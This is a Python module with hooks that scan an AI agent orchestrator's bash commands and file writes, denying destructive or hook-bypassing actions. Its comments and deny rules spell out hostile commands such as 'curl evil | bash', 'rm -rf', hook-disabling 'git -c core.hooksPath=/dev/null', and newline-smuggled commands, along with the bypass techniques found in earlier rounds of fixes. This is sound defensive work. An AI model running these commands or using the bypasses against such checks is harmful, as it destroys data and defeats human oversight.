"""PreToolUse / PostToolUse hooks — defence-in-depth bash/FS scanner.

**Role change (FS7, round 3, 2026-05-16):** primary safety for worker
isolation is the OS-level sandbox (`runtime/sandbox.py`, bwrap-backed). The
scanner below is now **defence-in-depth**, not primary safety. Three rounds
of fix-loops produced 15 new P0 bash bypasses in total — pattern matching
on bash text is fundamentally exhaustible. The sandbox blocks the *class*
of attacks at the FS/syscall level; the scanner stays as a second line that
catches known patterns and feeds the audit log.

Scanner deny still blocks the tool call (defence-in-depth retains its
teeth), but a deny while the sandbox is active is audit-severity ``info``
rather than ``warning`` — the sandbox would have stopped real damage
regardless.

Bash deny matrix — token-based, not substring (closes C5 substring-bypass family):
- `rm` with `-r/-R/--recursive` AND `-f/--force` AND NOT `-i/--interactive`
- `git push` with `-f/--force/--force-with-lease` OR positional `+refspec`
   OR positional refspec ending `:main`/`:master`/`:refs/heads/main`
- `git commit` with `-n/--no-verify` (flag-form), or `GIT_*_NO_VERIFY=*` env prefix
- `git reset --hard` (no positional OR positional in protected set + HEAD~*)
- `git clean -f/-fd/-df`
- Subshell vectors: `$(...)`, backticks, `${...}`, `<(...)`, `bash -c`, `sh -c`,
  `eval`, `exec`, `source`, `.` builtin
- `git merge` with target in {main, master} unless valid signed token present

Filesystem (Edit/Write/NotebookEdit/MultiEdit):
- relative paths resolved against `tool_input.get("cwd")` or
  `BMAD_WORKER_WORKTREE` env; missing cwd hint → deny `cwd_unknown`
- resolved path must lie within `orchestrator_home`/`target_project`
- if cwd hint == worktree root → also call `validate_worker_write_path`

All deny events recorded via `record_audit` with the matched pattern_id.
"""

from __future__ import annotations

import os
import shlex
from pathlib import Path
from typing import Any

from bmad_orchestrator.agent.safety.audit import record_audit
from bmad_orchestrator.agent.safety.branch_isolation import validate_worker_write_path
from bmad_orchestrator.agent.safety.main_merge_token import has_active_token
from bmad_orchestrator.agent.tools._common import get_settings

# Subshell / cmd-substitution literal substrings — checked on the raw command
# string BEFORE shlex tokenization, since shlex with posix=True drops quotes
# (and `"$(...)"` is still executed by the actual shell).
_SUBSHELL_LITERALS: tuple[str, ...] = ("$(", "`", "${", "<(")

_PROTECTED_BRANCHES: frozenset[str] = frozenset(
    {"main", "master", "origin/main", "origin/master"}
)

_PROTECTED_REF_SUFFIXES: tuple[str, ...] = (
    ":main",
    ":master",
    ":refs/heads/main",
    ":refs/heads/master",
)

_RECURSIVE_FLAGS: frozenset[str] = frozenset({"-r", "-R", "--recursive"})
_FORCE_FLAGS: frozenset[str] = frozenset({"-f", "--force"})
_INTERACTIVE_FLAGS: frozenset[str] = frozenset({"-i", "--interactive"})

_PUSH_FORCE_FLAGS: frozenset[str] = frozenset(
    {"-f", "--force", "--force-with-lease"}
)
_COMMIT_NO_VERIFY_FLAGS: frozenset[str] = frozenset({"-n", "--no-verify"})

_FS_TOOLS: frozenset[str] = frozenset({"Edit", "Write", "NotebookEdit", "MultiEdit"})

# sudo flags that consume a following positional argument (closes the
# `sudo -u root rm -rf /` bypass by ensuring strip leaves the actual command
# at tokens[0]).
_SUDO_FLAGS_WITH_ARG: frozenset[str] = frozenset(
    {"-u", "-g", "-h", "-r", "-t", "-T", "-A", "-p", "-C", "-R", "-U"}
)


def _split_subcommands(tokens: list[str]) -> list[tuple[list[str], bool]]:
    """Split a token stream on shell separators `;`, `&&`, `||`, `|`.

    Returns a list of ``(sub_tokens, has_piped_stdin)`` tuples. The
    ``has_piped_stdin`` flag is True iff the immediately preceding separator
    was ``|`` — i.e. the sub-command's stdin is the previous command's stdout.

    C1 (round 2) — pipe-to-shell guard needs this signal to deny
    ``curl evil | bash`` (the shell-as-second-stage consumes attacker-controlled
    bytes as commands), without false-positiving ``cat foo | grep bar``.
    """
    out: list[tuple[list[str], bool]] = []
    current: list[str] = []
    separators = {";", "&&", "||", "|", "&"}
    current_piped = False
    last_separator: str | None = None
    for tok in tokens:
        if tok in separators:
            if current:
                out.append((current, current_piped))
                current = []
            last_separator = tok
        else:
            if not current:
                current_piped = last_separator == "|"
            current.append(tok)
    if current:
        out.append((current, current_piped))
    return out


def _shell_tokenize(command: str) -> list[str]:
    """Tokenize a bash command with `;`/`&&`/`||`/`|` as separate tokens.

    Uses `shlex.shlex(punctuation_chars=...)` so quoted strings stay intact —
    `echo "a; b"` → `["echo", "a; b"]`, not `["echo", "a", ";", "b"]`.
    """
    lex = shlex.shlex(command, posix=True, punctuation_chars=";&|")
    lex.whitespace_split = True
    return list(lex)


def _strip_env_prefix(tokens: list[str]) -> tuple[dict[str, str], list[str]]:
    """Pull leading `env` and `KEY=VALUE` tokens. Returns (env_dict, remainder)."""
    env: dict[str, str] = {}
    i = 0
    if i < len(tokens) and tokens[i] == "env":
        i += 1
    while i < len(tokens):
        tok = tokens[i]
        if "=" not in tok:
            break
        key, _, value = tok.partition("=")
        if not key or not all(c.isalnum() or c == "_" for c in key):
            break
        env[key] = value
        i += 1
    return env, tokens[i:]


def _strip_sudo(tokens: list[str]) -> list[str]:
    """Unwrap a leading `sudo [flags] <cmd>` so the actual command surfaces."""
    if not tokens or tokens[0] != "sudo":
        return tokens
    i = 1
    while i < len(tokens):
        tok = tokens[i]
        if tok == "--":
            i += 1
            break
        if tok in _SUDO_FLAGS_WITH_ARG:
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        break
    return tokens[i:]


def _canonicalize_flags(tokens: list[str]) -> list[str]:
    """Split combined short options: `-rfu` → [`-r`, `-f`, `-u`]. Long flags untouched."""
    out: list[str] = []
    for tok in tokens:
        if tok.startswith("--"):
            out.append(tok)
        elif tok.startswith("-") and len(tok) > 2 and tok != "--":
            for ch in tok[1:]:
                out.append(f"-{ch}")
        else:
            out.append(tok)
    return out


def _basename(prog: str) -> str:
    return prog.rsplit("/", 1)[-1]


def _git_subcommand(
    tokens: list[str],
) -> tuple[str | None, list[str], list[tuple[str, str]]]:
    """Skip git's global flags to find the subcommand.

    Handles: `-c KEY=V`, `-C DIR`, `--git-dir=...`, `--work-tree=...`,
    `--no-pager`, `--paginate`, `--exec-path[=...]`, `--config-env=...`.

    C4 (round 2) — also collects ``-c KEY=VALUE`` global config overrides
    into the third return value so callers can detect
    ``git -c core.hooksPath=/dev/null commit`` (which silently bypasses
    pre-commit hooks regardless of the ``--no-verify`` flag).
    """
    configs: list[tuple[str, str]] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok == "-c" and i + 1 < len(tokens):
            kv = tokens[i + 1]
            key, _, value = kv.partition("=")
            configs.append((key, value))
            i += 2
            continue
        if tok in ("-C", "--config", "--git-dir", "--work-tree", "--namespace", "--exec-path", "--config-env"):
            i += 2
            continue
        if (
            tok.startswith("--git-dir=")
            or tok.startswith("--work-tree=")
            or tok.startswith("--namespace=")
            or tok.startswith("--exec-path=")
            or tok.startswith("--config-env=")
            or tok in ("--no-pager", "--paginate", "-p", "--bare", "--no-replace-objects")
        ):
            i += 1
            continue
        if not tok.startswith("-"):
            return tok, tokens[i + 1 :], configs
        i += 1
    return None, [], configs


def _check_git_config_overrides(
    configs: list[tuple[str, str]],
) -> tuple[bool, str | None, str | None]:
    """C4 — deny ``git -c <KEY>=<VALUE>`` patterns that disable hooks.

    Specifically:
    - ``core.hooksPath`` set to any path NOT inside ``.git/hooks`` (the only
      sanctioned hooks dir). Includes ``/dev/null`` and the empty string.
    - ``hooks.pre-commit`` / ``hooks.commit-msg`` / ``hooks.pre-push`` set to
      an empty value or ``/dev/null`` (effectively unsetting the hook).
    """
    hook_keys = {"hooks.pre-commit", "hooks.commit-msg", "hooks.pre-push", "hooks.post-commit"}
    for key, value in configs:
        if key == "core.hooksPath":
            if ".git/hooks" not in value:
                return (
                    True,
                    "git_no_verify_via_config",
                    f"git -c core.hooksPath={value!r} overrides hooks path",
                )
        if key in hook_keys:
            stripped = value.strip()
            if stripped in ("", "/dev/null", "true", "false"):
                return (
                    True,
                    "git_no_verify_via_config",
                    f"git -c {key}={value!r} disables the hook",
                )
    return False, None, None


def _has_no_verify_env(env: dict[str, str]) -> bool:
    """Detect `GIT_*_NO_VERIFY=1`-style env values (bypass hooks via env)."""
    for key, value in env.items():
        up = key.upper()
        if "NO_VERIFY" in up and value not in ("", "0", "false", "False", "no", "NO"):
            return True
    return False


def _flag_name(flag: str) -> str:
    """Strip `=value` from long flags so `--recursive=true` matches `--recursive`."""
    if flag.startswith("--") and "=" in flag:
        return flag.split("=", 1)[0]
    return flag


def _check_rm(flags_canon: list[str]) -> tuple[bool, str | None, str | None]:
    names = [_flag_name(f) for f in flags_canon]
    has_recursive = any(n in _RECURSIVE_FLAGS for n in names)
    has_force = any(n in _FORCE_FLAGS for n in names)
    has_interactive = any(n in _INTERACTIVE_FLAGS for n in names)
    if has_recursive and has_force and not has_interactive:
        return True, "rm_recursive_force", "rm -rf is irreversible"
    return False, None, None


def _check_git_push(gargs: list[str]) -> tuple[bool, str | None, str | None]:
    flags = _canonicalize_flags(gargs)
    if any(_flag_name(f) in _PUSH_FORCE_FLAGS for f in flags):
        return True, "git_push_force", "git push --force is destructive"
    positionals = [t for t in gargs if not t.startswith("-")]
    for p in positionals:
        if p.startswith("+"):
            return True, "git_push_force", f"git push refspec '{p}' uses + (force)"
        for suffix in _PROTECTED_REF_SUFFIXES:
            if p.endswith(suffix):
                return (
                    True,
                    "git_push_protected_ref",
                    f"git push targets protected ref '{p}'",
                )
    return False, None, None


def _check_git_commit(
    gargs: list[str], env: dict[str, str]
) -> tuple[bool, str | None, str | None]:
    if _has_no_verify_env(env):
        return True, "git_no_verify", "GIT_*_NO_VERIFY env bypasses pre-commit hooks"
    flags = _canonicalize_flags(gargs)
    if any(_flag_name(f) in _COMMIT_NO_VERIFY_FLAGS for f in flags):
        return True, "git_no_verify", "git commit --no-verify bypasses hooks"
    return False, None, None


def _check_git_reset(gargs: list[str]) -> tuple[bool, str | None, str | None]:
    flags = _canonicalize_flags(gargs)
    if "--hard" not in flags:
        return False, None, None
    positionals = [t for t in gargs if not t.startswith("-")]
    if not positionals:
        return (
            True,
            "git_reset_hard_protected",
            "git reset --hard (no target) wipes working tree",
        )
    for p in positionals:
        if p in _PROTECTED_BRANCHES or p.startswith("HEAD~") or p == "HEAD":
            return (
                True,
                "git_reset_hard_protected",
                f"git reset --hard on protected ref '{p}'",
            )
    return False, None, None


def _check_git_merge(gargs: list[str]) -> tuple[bool, str | None, str | None]:
    positionals = [t for t in gargs if not t.startswith("-")]
    for p in positionals:
        if p in ("main", "master"):
            allowed, _reason = has_active_token()
            if not allowed:
                return (
                    True,
                    "git_merge_into_protected_branch",
                    f"git merge → {p} requires signed main-merge token",
                )
    return False, None, None


def _check_git_clean(gargs: list[str]) -> tuple[bool, str | None, str | None]:
    flags = _canonicalize_flags(gargs)
    if any(_flag_name(f) in _FORCE_FLAGS for f in flags):
        return True, "git_clean_force", "git clean -f is irreversible"
    return False, None, None


def _check_git_checkout(gargs: list[str]) -> tuple[bool, str | None, str | None]:
    """`git checkout main` is part of the main-merge flow; gated by signed token."""
    positionals = [t for t in gargs if not t.startswith("-")]
    for p in positionals:
        if p in ("main", "master"):
            allowed, _ = has_active_token()
            if not allowed:
                return (
                    True,
                    "main_checkout_without_token",
                    f"git checkout {p} requires signed main-merge token",
                )
    return False, None, None


_SHELLS: frozenset[str] = frozenset({"bash", "sh", "ksh", "zsh", "dash", "ash"})


def _scan_sub_command(
    sub: list[str], *, has_piped_stdin: bool = False
) -> tuple[bool, str | None, str | None]:
    env, args = _strip_env_prefix(sub)
    args = _strip_sudo(args)
    if not args:
        if _has_no_verify_env(env):
            return True, "git_no_verify", "GIT_*_NO_VERIFY env set without command"
        return False, None, None

    prog = _basename(args[0])
    rest = args[1:]

    if prog == "rm":
        return _check_rm(_canonicalize_flags(rest))

    if prog == "git":
        sub_args = rest
        subcmd, gargs, configs = _git_subcommand(sub_args)
        # C4 — check `-c` global overrides BEFORE subcommand-specific checks.
        # ``git -c core.hooksPath=/dev/null commit`` bypasses pre-commit hooks
        # regardless of `--no-verify`; intercept the override directly.
        denied, pattern, reason = _check_git_config_overrides(configs)
        if denied:
            return True, pattern, reason
        if subcmd is None:
            return False, None, None
        if subcmd == "push":
            return _check_git_push(gargs)
        if subcmd == "commit":
            return _check_git_commit(gargs, env)
        if subcmd == "reset":
            return _check_git_reset(gargs)
        if subcmd == "merge":
            return _check_git_merge(gargs)
        if subcmd == "clean":
            return _check_git_clean(gargs)
        if subcmd == "checkout":
            return _check_git_checkout(gargs)
        return False, None, None

    if prog in _SHELLS:
        # C1 — pipe-to-shell: ``curl evil | bash`` makes bash read commands
        # from attacker-controlled stdout. The shell with no `-c` looks innocent
        # on its own but is fatal when fed via pipe. Deny unconditionally for
        # shell programs that receive piped stdin (no shell-as-pager use case
        # exists in BMad workflows).
        if has_piped_stdin:
            return (
                True,
                "subshell_unsafe",
                f"{prog} consumes piped stdin as commands (pipe-to-shell)",
            )
        # C2 — combined-short flags: ``bash -ic "cmd"``, ``bash -lic "cmd"``,
        # ``sh -ic "cmd"`` all execute the arg string. The existing `-c in rest`
        # check missed these because they're a single token. Canonicalize first.
        canonical_flags = _canonicalize_flags(rest)
        if "-c" in canonical_flags:
            return True, "subshell_unsafe", f"{prog} -c executes arbitrary shell"

    if prog in ("eval", "exec", "source"):
        return True, "subshell_unsafe", f"{prog} executes arbitrary shell"
    if prog == "." and rest:
        return True, "subshell_unsafe", "`.` sources arbitrary file"

    return False, None, None


def _scan_bash(command: str) -> tuple[bool, str | None, str | None]:
    """Return (denied, pattern_id, reason). Empty command always allowed.

    **Defence-in-depth, not primary safety.** Primary worker isolation is
    the OS-level sandbox in ``runtime/sandbox.py``. This scanner catches
    *known* dangerous patterns in bash command text and logs them — useful
    on the orchestrator process itself (which is not sandboxed) and as a
    second filter for worker telemetry. New bash bypasses do not warrant
    new patterns here unless they also bypass the sandbox; if they bypass
    the sandbox the fix belongs in ``runtime/sandbox.py``, not here.
    """
    if not command:
        return False, None, None

    # C3 — newline-as-separator: shells treat raw ``\n`` between commands like
    # ``;``. shlex with posix=True tokenises ``echo a\nrm -rf /tmp/x`` as
    # ``["echo", "a\nrm", "-rf", "/tmp/x"]`` which neuters the per-subcommand
    # scan. Normalise raw newlines (NOT newlines inside quoted strings — those
    # are handled by shlex itself) to ``;`` BEFORE tokenisation. CR variants
    # included to cover Windows line endings.
    stripped = command.strip()
    stripped = stripped.replace("\r\n", ";").replace("\n", ";").replace("\r", ";")

    for literal in _SUBSHELL_LITERALS:
        if literal in stripped:
            return (
                True,
                "subshell_unsafe",
                f"command contains '{literal}' (command substitution)",
            )

    try:
        tokens = _shell_tokenize(stripped)
    except ValueError as exc:
        return True, "shlex_parse_error", f"unparseable command ({exc})"

    if not tokens:
        return False, None, None

    sub_commands = _split_subcommands(tokens)
    for sub_tokens, has_piped_stdin in sub_commands:
        denied, pattern, reason = _scan_sub_command(
            sub_tokens, has_piped_stdin=has_piped_stdin
        )
        if denied:
            return True, pattern, reason

    return False, None, None


def _agent_write_roots() -> tuple[Path, ...]:
    """Allowed roots for Edit/Write. Symlinks resolved."""
    settings = get_settings()
    roots: list[Path] = []
    for p in (settings.target_project, settings.orchestrator_home):
        try:
            roots.append(p.resolve())
        except OSError:
            roots.append(p)
    return tuple(roots)


def _is_under(child: Path, parent: Path) -> bool:
    try:
        child.relative_to(parent)
    except ValueError:
        return False
    return True


def _resolve_cwd_hint(tool_input: dict[str, Any]) -> str | None:
    """Source order: tool_input['cwd'] → BMAD_WORKER_WORKTREE env."""
    hint = tool_input.get("cwd")
    if isinstance(hint, str) and hint:
        return hint
    env_hint = os.environ.get("BMAD_WORKER_WORKTREE")
    if env_hint:
        return env_hint
    return None


def _scan_filesystem_write(
    tool_name: str, tool_input: dict[str, Any]
) -> tuple[bool, str | None, str | None]:
    if tool_name not in _FS_TOOLS:
        return False, None, None
    path_str = tool_input.get("file_path") or tool_input.get("notebook_path")
    if not isinstance(path_str, str) or not path_str:
        return False, None, None

    candidate = Path(path_str)
    cwd_hint = _resolve_cwd_hint(tool_input)

    if not candidate.is_absolute():
        if cwd_hint is None:
            return (
                True,
                "cwd_unknown",
                f"relative path {path_str!r} cannot be resolved (no cwd hint)",
            )
        candidate = Path(cwd_hint) / candidate

    try:
        resolved = candidate.resolve(strict=False)
    except OSError:
        resolved = candidate

    roots = _agent_write_roots()
    if not any(_is_under(resolved, root) for root in roots):
        return (
            True,
            "fs_write_out_of_scope",
            f"Edit/Write to {resolved} outside allowed roots {[str(r) for r in roots]}",
        )

    if cwd_hint:
        ok, reason = validate_worker_write_path(resolved, cwd_hint)
        if not ok:
            return True, "fs_write_escapes_worktree", reason

    return False, None, None


async def security_check_hook(
    input_data: dict[str, Any],
    tool_use_id: str | None,
    context: Any,
) -> dict[str, Any]:
    """PreToolUse hook — deny dangerous tool calls per spec §9.1 + FS2 hardening."""
    tool_name = str(input_data.get("tool_name", ""))
    tool_input = input_data.get("tool_input", {}) or {}

    denied = False
    pattern: str | None = None
    reason: str | None = None

    if tool_name == "Bash":
        command = str(tool_input.get("command", ""))
        denied, pattern, reason = _scan_bash(command)

    if not denied:
        denied, pattern, reason = _scan_filesystem_write(tool_name, tool_input)

    if denied:
        # FS7 — when the OS-level sandbox is active for worker subprocesses,
        # the scanner-deny is a defence-in-depth catch (the sandbox would
        # have neutralised damage regardless). Downgrade audit severity to
        # ``info`` so SIEM noise reflects actual risk; otherwise mark as
        # ``warning``. Deny still blocks the tool call either way.
        from bmad_orchestrator.runtime.sandbox import detect_sandbox
        sandbox_active = detect_sandbox().kind != "none"
        severity = "info" if sandbox_active else "warning"
        record_audit(
            "pretooluse_deny",
            tool_name=tool_name,
            tool_use_id=tool_use_id,
            pattern=pattern,
            reason=reason,
            tool_input=tool_input,
            severity=severity,
            sandbox_active=sandbox_active,
        )
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": f"{pattern}: {reason}",
            }
        }

    return {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "allow",
        }
    }


async def audit_tool_output(
    input_data: dict[str, Any],
    tool_use_id: str | None,
    context: Any,
) -> dict[str, Any]:
    """PostToolUse hook — pipes tool result into the audit log JSONL."""
    tool_name = str(input_data.get("tool_name", ""))
    if not tool_name:
        return {}
    record_audit(
        "posttooluse",
        tool_name=tool_name,
        tool_use_id=tool_use_id,
        tool_input=input_data.get("tool_input"),
        tool_output_present=input_data.get("tool_response") is not None,
    )
    return {}


__all__ = [
    "audit_tool_output",
    "security_check_hook",
    "validate_worker_write_path",
]
